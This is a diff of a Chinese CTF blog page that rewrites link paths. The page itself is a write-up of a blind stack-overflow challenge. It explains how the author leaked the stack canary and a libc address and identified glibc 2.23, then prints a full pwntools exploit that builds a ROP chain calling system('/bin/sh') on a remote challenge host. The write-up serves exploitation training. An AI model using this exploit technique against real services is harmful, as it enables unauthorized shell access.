@@ -5,43 +5,43 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/ha1vk/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
   <meta name="description" content="这题，没有提供给我们二进制文件，仅仅有一个可交互的地址。由题意也可以知道，它存在栈溢出。这是一个**[栈溢出盲打]{.mark}**的题目。 首先，就是确定栈溢出的长度   我们发现，当我们**[输入23个整数后，就发生了溢出]{.mark}**报错，同时，我们也知道了,这个程序开启了canary机制，这正好被我们利用起来判断栈溢出的长度。 接下来，就是泄露栈数据了，主要依靠功能3，它会把数组里的">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Stackoverflow(栈溢出盲打)">
-<meta property="og:url" content="https://github.com/ha1vk/2020/01/28/stackoverflow/index.html">
+<meta property="og:url" content="https://github.com/2020/01/28/stackoverflow/index.html">
 <meta property="og:site_name" content="ha1vk&#39;s blog">
 <meta property="og:description" content="这题，没有提供给我们二进制文件，仅仅有一个可交互的地址。由题意也可以知道，它存在栈溢出。这是一个**[栈溢出盲打]{.mark}**的题目。 首先，就是确定栈溢出的长度   我们发现，当我们**[输入23个整数后，就发生了溢出]{.mark}**报错，同时，我们也知道了,这个程序开启了canary机制，这正好被我们利用起来判断栈溢出的长度。 接下来，就是泄露栈数据了，主要依靠功能3，它会把数组里的">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://github.com/ha1vk/2020/01/28/stackoverflow/image1.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/01/28/stackoverflow/image2.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/01/28/stackoverflow/image3.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/01/28/stackoverflow/image4.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/01/28/stackoverflow/image5.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/01/28/stackoverflow/image6.JPG">
+<meta property="og:image" content="https://github.com/2020/01/28/stackoverflow/image1.JPG">
+<meta property="og:image" content="https://github.com/2020/01/28/stackoverflow/image2.JPG">
+<meta property="og:image" content="https://github.com/2020/01/28/stackoverflow/image3.JPG">
+<meta property="og:image" content="https://github.com/2020/01/28/stackoverflow/image4.JPG">
+<meta property="og:image" content="https://github.com/2020/01/28/stackoverflow/image5.JPG">
+<meta property="og:image" content="https://github.com/2020/01/28/stackoverflow/image6.JPG">
 <meta property="article:published_time" content="2020-01-28T03:14:50.000Z">
 <meta property="article:modified_time" content="2025-06-21T11:18:28.204Z">
 <meta property="article:author" content="ha1vk">
 <meta property="article:tag" content="栈溢出">
 <meta property="article:tag" content="盲打">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/ha1vk/2020/01/28/stackoverflow/image1.JPG">
+<meta name="twitter:image" content="https://github.com/2020/01/28/stackoverflow/image1.JPG">
 
-<link rel="canonical" href="https://github.com/ha1vk/2020/01/28/stackoverflow/">
+<link rel="canonical" href="https://github.com/2020/01/28/stackoverflow/">
 
 
 <script id="page-configurations">
@@ -103,7 +103,7 @@
 
   <div class="site-meta">
 
-    <a href="/ha1vk/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">ha1vk's blog</h1>
       <span class="logo-line-after"><i></i></span>
@@ -124,27 +124,27 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
 
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
 
   </li>
         <li class="menu-item menu-item-about">
 
-    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -202,10 +202,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/01/28/stackoverflow/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/2020/01/28/stackoverflow/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="ha1vk">
       <meta itemprop="description" content="">
     </span>
@@ -240,7 +240,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                 </span>
             </span>
 
@@ -264,25 +264,25 @@
       
         <p>这题，没有提供给我们二进制文件，仅仅有一个可交互的地址。由题意也可以知道，它存在栈溢出。这是一个**[栈溢出盲打]{.mark}**的题目。</p>
 <p>首先，就是确定栈溢出的长度</p>
-<img src="/ha1vk/2020/01/28/stackoverflow/image1.JPG" class="">
+<img src="/2020/01/28/stackoverflow/image1.JPG" class="">
 
 <p>我们发现，当我们**[输入23个整数后，就发生了溢出]{.mark}**报错，同时，我们也知道了,这个程序开启了canary机制，这正好被我们利用起来判断栈溢出的长度。</p>
 <p>接下来，就是泄露栈数据了，主要依靠功能3，它会把数组里的数据相邻的去重后输出</p>
-<img src="/ha1vk/2020/01/28/stackoverflow/image2.JPG" class="">
+<img src="/2020/01/28/stackoverflow/image2.JPG" class="">
 
 <p>但这似乎不容易发现什么，我们不如转换成十六进制，来观察</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getStackData</span>():  </span><br><span class="line">   data = []  </span><br><span class="line">   changeNum(<span class="number">50</span>)  </span><br><span class="line">   unique()  </span><br><span class="line">   data_s = (sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).strip(<span class="string">&#x27; &#x27;</span>)).split(<span class="string">&#x27; &#x27;</span>)  </span><br><span class="line">   <span class="keyword">for</span> s <span class="keyword">in</span> data_s:  </span><br><span class="line">      x = <span class="built_in">int</span>(s,<span class="number">10</span>)  </span><br><span class="line">      <span class="keyword">if</span> x &lt; <span class="number">0</span>:  </span><br><span class="line">         x = <span class="number">0x100000000</span> + x  </span><br><span class="line">      data.append(x)  </span><br><span class="line">   <span class="keyword">return</span> data  </span><br></pre></td></tr></table></figure>
 
-<img src="/ha1vk/2020/01/28/stackoverflow/image3.JPG" class="">
+<img src="/2020/01/28/stackoverflow/image3.JPG" class="">
 
 <p>我们需要确定程序位数，一开始，我以为程序是32位的，以为这里面数据都是4字节，后来分析，发现32位的话，分析不出什么信息，我们看到栈里面有一个数据是一直没变,并且有些数据末尾3个十六进制数据也没变</p>
-<img src="/ha1vk/2020/01/28/stackoverflow/image4.JPG" class="">
+<img src="/2020/01/28/stackoverflow/image4.JPG" class="">
 
 <p>0x401020应该是程序里的某个地方，而0x______830应该是libc中的某个地方，并且64位程序如果没开启PIE,程序的加载基址就是从0x400000开始，由此，我们可以判断这是一个64位的程序，那么就能解释的通顺了,0x401020是main函数的ebp处，前面两个4字节数据构成了8字节的canary,而0x7f6c和0xbdfbb**[830]{.mark}<strong>构成了libc_start_main里的某处地址，看末尾的</strong>[830]{.mark}**数据，根据经验，以及日常刷题的熟练，感觉很眼熟，这好像是libc2.23版本里面的，于是，我们在glibc2.23环境下，随便运行一个二进制文件，观察栈布局</p>
-<img src="/ha1vk/2020/01/28/stackoverflow/image5.JPG" class="">
+<img src="/2020/01/28/stackoverflow/image5.JPG" class="">
 
 <p>那么，我们可以确定，程序的glibc就是2.23版本，那么我们就能计算出glibc基地址，进而计算出需要的函数即字符串的地址。那么接下来的操作就是一个简单的栈溢出操作，只不过，我们在写数据的时候，需要把8字节数据拆分后再写。为了调用system(“&#x2F;bin&#x2F;sh”)，在64位程序下，我们还需要pop rdi;ret这个gadget，我们可以在libc2.23中查找。</p>
-<img src="/ha1vk/2020/01/28/stackoverflow/image6.JPG" class="">
+<img src="/2020/01/28/stackoverflow/image6.JPG" class="">
 
 <p>综上，我们的exp脚本如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np  </span><br><span class="line">  </span><br><span class="line">sh = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="number">46999</span>)  </span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)  </span><br><span class="line">system_s = libc.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">binsh_s = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()  </span><br><span class="line">pop_rdi = <span class="number">0x21102</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unique</span>():  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changeNum</span>(<span class="params">num</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">   sh.sendline(<span class="built_in">str</span>(num))  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setArray</span>(<span class="params">arr</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">   sh.recvuntil(<span class="string">&#x27;num:&#x27;</span>)  </span><br><span class="line">   <span class="keyword">for</span> x <span class="keyword">in</span> arr:  </span><br><span class="line">      sh.sendline(<span class="built_in">str</span>(x))  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getStackData</span>():  </span><br><span class="line">   data = []  </span><br><span class="line">   changeNum(<span class="number">50</span>)  </span><br><span class="line">   unique()  </span><br><span class="line">   data_s = (sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).strip(<span class="string">&#x27; &#x27;</span>)).split(<span class="string">&#x27; &#x27;</span>)  </span><br><span class="line">   <span class="keyword">for</span> s <span class="keyword">in</span> data_s:  </span><br><span class="line">      x = <span class="built_in">int</span>(s,<span class="number">10</span>)  </span><br><span class="line">      <span class="keyword">if</span> x &lt; <span class="number">0</span>:  </span><br><span class="line">         x = <span class="number">0x100000000</span> + x  </span><br><span class="line">      <span class="comment">#print hex(x)  </span></span><br><span class="line">      data.append(x)  </span><br><span class="line">   <span class="keyword">return</span> data  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#将8字节数据拆分为2个4字节  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_data</span>(<span class="params">data</span>):  </span><br><span class="line">   data0 = data &amp; <span class="number">0xFFFFFFFF</span>  </span><br><span class="line">   <span class="keyword">if</span> data0 &amp; <span class="number">0x80000000</span> != <span class="number">0</span>:  </span><br><span class="line">      data0 = -<span class="number">0x100000000</span> + data0  </span><br><span class="line">  </span><br><span class="line">   data1 = (data &amp; <span class="number">0xFFFFFFFF00000000</span>) &gt;&gt; <span class="number">32</span>  </span><br><span class="line">   <span class="keyword">if</span> data1 &amp; <span class="number">0x80000000</span> != <span class="number">0</span>:  </span><br><span class="line">      data1 = -<span class="number">0x100000000</span> + data1  </span><br><span class="line">   <span class="keyword">return</span> [data0,data1]  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#经过测试,缓冲区大小为22个int，下一个区域就是canary  </span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;input n:&#x27;</span>,<span class="string">&#x27;22&#x27;</span>)  </span><br><span class="line"><span class="comment">#初始化输入全0  </span></span><br><span class="line">setArray(np.zeros(<span class="number">22</span>,dtype=<span class="built_in">int</span>))  </span><br><span class="line">  </span><br><span class="line">data = getStackData()  </span><br><span class="line"><span class="comment">#程序是64位的，数据被截成两部分了  </span></span><br><span class="line">canary0 = data[<span class="number">1</span>]  </span><br><span class="line">canary1 = data[<span class="number">2</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#判断四字节数据是否为负数，是则需要转换回去  </span></span><br><span class="line"><span class="keyword">if</span> canary0 &amp; <span class="number">0x80000000</span> != <span class="number">0</span>:  </span><br><span class="line">   canary0 = -<span class="number">0x100000000</span> + canary0  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> canary1 &amp; <span class="number">0x80000000</span> != <span class="number">0</span>:  </span><br><span class="line">   canary1 = -<span class="number">0x100000000</span> + canary1  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">__libc_start_main_F0 = (data[<span class="number">6</span>] &lt;&lt; <span class="number">32</span>) + data[<span class="number">5</span>]  </span><br><span class="line">__libc_start_main_addr = __libc_start_main_F0 - <span class="number">0xF0</span>  </span><br><span class="line">libc_base = __libc_start_main_addr - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]  </span><br><span class="line">system_addr = libc_base + system_s  </span><br><span class="line">binsh_addr = libc_base + binsh_s  </span><br><span class="line">pop_rdi_addr = libc_base + pop_rdi  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#拆分8字节数据为4字节  </span></span><br><span class="line">pop_rdi_addr = split_data(pop_rdi_addr)  </span><br><span class="line">binsh_addr = split_data(binsh_addr)  </span><br><span class="line">system_addr = split_data(system_addr)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">changeNum(<span class="number">32</span>)  </span><br><span class="line">arr = <span class="built_in">list</span>(np.zeros(<span class="number">22</span>,dtype=<span class="built_in">int</span>))  </span><br><span class="line">arr.append(canary0)  </span><br><span class="line">arr.append(canary1)  </span><br><span class="line">arr.append(<span class="number">0</span>)  </span><br><span class="line">arr.append(<span class="number">0</span>)  </span><br><span class="line">arr.append(pop_rdi_addr[<span class="number">0</span>])  </span><br><span class="line">arr.append(pop_rdi_addr[<span class="number">1</span>])  </span><br><span class="line">arr.append(binsh_addr[<span class="number">0</span>])  </span><br><span class="line">arr.append(binsh_addr[<span class="number">1</span>])  </span><br><span class="line">arr.append(system_addr[<span class="number">0</span>])  </span><br><span class="line">arr.append(system_addr[<span class="number">1</span>])  </span><br><span class="line">  </span><br><span class="line">setArray(arr)  </span><br><span class="line"><span class="comment">#getshell  </span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>
@@ -297,8 +297,8 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/ha1vk/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag"># 栈溢出</a>
-              <a href="/ha1vk/tags/%E7%9B%B2%E6%89%93/" rel="tag"># 盲打</a>
+              <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag"># 栈溢出</a>
+              <a href="/tags/%E7%9B%B2%E6%89%93/" rel="tag"># 盲打</a>
           </div>
 
         
@@ -307,11 +307,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/ha1vk/2019/12/20/NoBug/" rel="prev" title="Nobug">
+    <a href="/2019/12/20/NoBug/" rel="prev" title="Nobug">
       <i class="fa fa-chevron-left"></i> Nobug
     </a></div>
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/02/05/250/" rel="next" title="250">
+    <a href="/2020/02/05/250/" rel="next" title="250">
       250 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -383,20 +383,20 @@
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/ha1vk/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">233</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-            <a href="/ha1vk/categories/">
+            <a href="/categories/">
           
         <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/ha1vk/tags/">
+            <a href="/tags/">
           
         <span class="site-state-item-count">145</span>
         <span class="site-state-item-name">标签</span></a>
@@ -469,30 +469,30 @@
   </div>
 
   
-  <script src="/ha1vk/lib/anime.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/ha1vk/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/ha1vk/js/motion.js"></script>
-
-
-<script src="/ha1vk/js/schemes/muse.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/ha1vk/js/next-boot.js"></script>
+<script src="/js/schemes/muse.js"></script>
 
 
-
-
-  
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
 
 
 
